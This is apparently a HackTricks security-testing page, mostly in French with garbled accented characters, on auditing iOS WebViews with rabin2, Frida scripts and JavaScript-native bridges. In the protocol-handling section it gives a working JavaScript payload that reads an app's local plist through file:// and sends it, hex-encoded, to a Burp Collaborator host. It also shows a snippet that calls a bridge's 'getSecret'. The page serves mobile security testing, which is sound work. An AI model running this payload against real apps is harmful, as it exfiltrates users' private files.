# iOS WebViews

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

The code of this page was extracted from [here](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Check the page for further details.


## Types de WebViews

Les WebViews sont utilis√©es dans les applications pour afficher du contenu web de mani√®re interactive. Diff√©rents types de WebViews offrent diff√©rentes fonctionnalit√©s et caract√©ristiques de s√©curit√© pour les applications iOS. Voici un bref aper√ßu :

- **UIWebView**, qui n'est plus recommand√© √† partir d'iOS 12 en raison de son manque de support pour d√©sactiver **JavaScript**, ce qui la rend susceptible √† l'injection de scripts et aux attaques de **Cross-Site Scripting (XSS)**.

- **WKWebView** est l'option pr√©f√©r√©e pour int√©grer du contenu web dans les applications, offrant un meilleur contr√¥le sur le contenu et les fonctionnalit√©s de s√©curit√©. **JavaScript** est activ√© par d√©faut, mais il peut √™tre d√©sactiv√© si n√©cessaire. Il prend √©galement en charge des fonctionnalit√©s pour emp√™cher JavaScript d'ouvrir automatiquement des fen√™tres et garantit que tout le contenu est charg√© de mani√®re s√©curis√©e. De plus, l'architecture de **WKWebView** minimise le risque de corruption de m√©moire affectant le processus principal de l'application.

- **SFSafariViewController** offre une exp√©rience de navigation web standardis√©e au sein des applications, reconnaissable par sa mise en page sp√©cifique incluant un champ d'adresse en lecture seule, des boutons de partage et de navigation, et un lien direct pour ouvrir le contenu dans Safari. Contrairement √† **WKWebView**, **JavaScript** ne peut pas √™tre d√©sactiv√© dans **SFSafariViewController**, qui partage √©galement des cookies et des donn√©es avec Safari, pr√©servant la vie priv√©e de l'utilisateur vis-√†-vis de l'application. Il doit √™tre affich√© de mani√®re pro√©minente conform√©ment aux directives de l'App Store.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews Configuration Exploration Summary

### **Static Analysis Overview**

Dans le processus d'examen des configurations de **WebViews**, deux types principaux sont cibl√©s : **UIWebView** et **WKWebView**. Pour identifier ces WebViews dans un binaire, des commandes sont utilis√©es, recherchant des r√©f√©rences de classe sp√©cifiques et des m√©thodes d'initialisation.

- **UIWebView Identification**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Cette commande aide √† localiser des instances de **UIWebView** en recherchant des cha√Ænes de texte qui y sont li√©es dans le binaire.

- **Identification de WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
De m√™me, pour **WKWebView**, cette commande recherche dans le binaire des cha√Ænes de texte indicatives de son utilisation.

De plus, pour trouver comment un **WKWebView** est initialis√©, la commande suivante est ex√©cut√©e, ciblant la signature de m√©thode li√©e √† son initialisation :
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **V√©rification de la Configuration JavaScript**

Pour **WKWebView**, il est soulign√© que d√©sactiver JavaScript est une bonne pratique sauf si n√©cessaire. Le binaire compil√© est recherch√© pour confirmer que la propri√©t√© `javaScriptEnabled` est d√©finie sur `false`, garantissant que JavaScript est d√©sactiv√© :
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **V√©rification du contenu uniquement s√©curis√©**

**WKWebView** offre la capacit√© d'identifier les probl√®mes de contenu mixte, contrairement √† **UIWebView**. Cela est v√©rifi√© en utilisant la propri√©t√© `hasOnlySecureContent` pour s'assurer que toutes les ressources de la page sont charg√©es via des connexions s√©curis√©es. La recherche dans le binaire compil√© est effectu√©e comme suit :
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Aper√ßus de l'analyse dynamique**

L'analyse dynamique consiste √† inspecter le tas pour les instances de WebView et leurs propri√©t√©s. Un script nomm√© `webviews_inspector.js` est utilis√© √† cet effet, ciblant les instances `UIWebView`, `WKWebView` et `SFSafariViewController`. Il enregistre des informations sur les instances trouv√©es, y compris les URL et les param√®tres li√©s √† JavaScript et au contenu s√©curis√©.

L'inspection du tas peut √™tre effectu√©e en utilisant `ObjC.choose()` pour identifier les instances de WebView et v√©rifier les propri√©t√©s `javaScriptEnabled` et `hasonlysecurecontent`.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Le script est ex√©cut√© avec :
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**R√©sultats Cl√©s**:
- Les instances de WebViews sont localis√©es et inspect√©es avec succ√®s.
- L'activation de JavaScript et les param√®tres de contenu s√©curis√© sont v√©rifi√©s.

Ce r√©sum√© encapsule les √©tapes et commandes critiques impliqu√©es dans l'analyse des configurations de WebView √† travers des approches statiques et dynamiques, en se concentrant sur des fonctionnalit√©s de s√©curit√© telles que l'activation de JavaScript et la d√©tection de contenu mixte.

## Gestion du Protocole WebView

La gestion du contenu dans les WebViews est un aspect critique, surtout lorsqu'il s'agit de divers protocoles tels que `http(s)://`, `file://`, et `tel://`. Ces protocoles permettent le chargement de contenu √† la fois distant et local au sein des applications. Il est soulign√© que lors du chargement de contenu local, des pr√©cautions doivent √™tre prises pour emp√™cher les utilisateurs d'influencer le nom ou le chemin du fichier et de modifier le contenu lui-m√™me.

**WebViews** offrent diff√©rentes m√©thodes pour le chargement de contenu. Pour **UIWebView**, d√©sormais obsol√®te, des m√©thodes telles que `loadHTMLString:baseURL:` et `loadData:MIMEType:textEncodingName:baseURL:` sont utilis√©es. **WKWebView**, en revanche, utilise `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:`, et `loadRequest:` pour le contenu web. Des m√©thodes telles que `pathForResource:ofType:`, `URLForResource:withExtension:`, et `init(contentsOf:encoding:)` sont g√©n√©ralement utilis√©es pour charger des fichiers locaux. La m√©thode `loadFileURL:allowingReadAccessToURL:` est particuli√®rement notable pour sa capacit√© √† charger une URL ou un r√©pertoire sp√©cifique dans le WebView, exposant potentiellement des donn√©es sensibles si un r√©pertoire est sp√©cifi√©.

Pour trouver ces m√©thodes dans le code source ou le binaire compil√©, des commandes comme les suivantes peuvent √™tre utilis√©es :
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
Concernant **l'acc√®s aux fichiers**, UIWebView le permet universellement, tandis que WKWebView introduit les param√®tres `allowFileAccessFromFileURLs` et `allowUniversalAccessFromFileURLs` pour g√©rer l'acc√®s √† partir des URL de fichiers, les deux √©tant faux par d√©faut.

Un exemple de script Frida est fourni pour inspecter les configurations de **WKWebView** pour les param√®tres de s√©curit√© :
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Enfin, un exemple de charge utile JavaScript visant √† exfiltrer des fichiers locaux d√©montre le risque de s√©curit√© potentiel associ√© √† des WebViews mal configur√©s. Cette charge utile encode le contenu des fichiers au format hexad√©cimal avant de les transmettre √† un serveur, soulignant l'importance de mesures de s√©curit√© strictes dans les impl√©mentations de WebView.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M√©thodes natives expos√©es via WebViews

## Comprendre les interfaces natives WebView dans iOS

Depuis iOS 7, Apple a fourni des API pour **la communication entre JavaScript dans un WebView et des** objets Swift ou Objective-C natifs. Cette int√©gration est principalement facilit√©e par deux m√©thodes :

- **JSContext** : Une fonction JavaScript est automatiquement cr√©√©e lorsqu'un bloc Swift ou Objective-C est li√© √† un identifiant dans un `JSContext`. Cela permet une int√©gration et une communication fluides entre JavaScript et le code natif.
- **JSExport Protocol** : En h√©ritant du protocole `JSExport`, les propri√©t√©s natives, les m√©thodes d'instance et les m√©thodes de classe peuvent √™tre expos√©es √† JavaScript. Cela signifie que tout changement effectu√© dans l'environnement JavaScript est refl√©t√© dans l'environnement natif, et vice versa. Cependant, il est essentiel de s'assurer que les donn√©es sensibles ne sont pas expos√©es involontairement par ce biais.

### Acc√©der √† `JSContext` en Objective-C

En Objective-C, le `JSContext` pour un `UIWebView` peut √™tre r√©cup√©r√© avec la ligne de code suivante :
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Communication with `WKWebView`

Pour `WKWebView`, l'acc√®s direct √† `JSContext` n'est pas disponible. Au lieu de cela, le passage de messages est utilis√© via la fonction `postMessage`, permettant la communication entre JavaScript et le natif. Les gestionnaires pour ces messages sont configur√©s comme suit, permettant √† JavaScript d'interagir avec l'application native de mani√®re s√©curis√©e :
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interaction et Test

JavaScript peut interagir avec la couche native en d√©finissant un gestionnaire de messages de script. Cela permet des op√©rations comme l'invocation de fonctions natives depuis une page web :
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Pour capturer et manipuler le r√©sultat d'un appel de fonction natif, on peut remplacer la fonction de rappel dans le HTML :
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
La partie native g√®re l'appel JavaScript comme indiqu√© dans la classe `JavaScriptBridgeMessageHandler`, o√π le r√©sultat des op√©rations comme la multiplication de nombres est trait√© et renvoy√© √† JavaScript pour affichage ou manipulation suppl√©mentaire :
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## D√©bogage des WebViews iOS

(Tutoriel bas√© sur celui de [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Pour d√©boguer efficacement le contenu web dans les webviews iOS, une configuration sp√©cifique impliquant les outils de d√©veloppement de Safari est n√©cessaire en raison du fait que les messages envoy√©s √† `console.log()` ne s'affichent pas dans les journaux Xcode. Voici un guide simplifi√©, mettant en avant les √©tapes et exigences cl√©s :

- **Pr√©paration sur l'appareil iOS** : L'inspecteur web de Safari doit √™tre activ√© sur votre appareil iOS. Cela se fait en allant dans **R√©glages > Safari > Avanc√©**, et en activant l' _Inspecteur Web_.

- **Pr√©paration sur l'appareil macOS** : Sur votre machine de d√©veloppement macOS, vous devez activer les outils de d√©veloppement dans Safari. Lancez Safari, acc√©dez √† **Safari > Pr√©f√©rences > Avanc√©**, et s√©lectionnez l'option _Afficher le menu D√©veloppement_.

- **Connexion et d√©bogage** : Apr√®s avoir connect√© votre appareil iOS √† votre ordinateur macOS et lanc√© votre application, utilisez Safari sur votre appareil macOS pour s√©lectionner la webview que vous souhaitez d√©boguer. Naviguez vers _D√©veloppement_ dans la barre de menu de Safari, survolez le nom de votre appareil iOS pour voir une liste des instances de webview, et s√©lectionnez l'instance que vous souhaitez inspecter. Une nouvelle fen√™tre de l'inspecteur web de Safari s'ouvrira √† cet effet.

Cependant, soyez conscient des limitations :

- Le d√©bogage avec cette m√©thode n√©cessite un appareil macOS car il repose sur Safari.
- Seules les webviews dans les applications charg√©es sur votre appareil via Xcode sont √©ligibles au d√©bogage. Les webviews dans les applications install√©es via l'App Store ou Apple Configurator ne peuvent pas √™tre d√©bogu√©es de cette mani√®re.

## R√©f√©rences

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
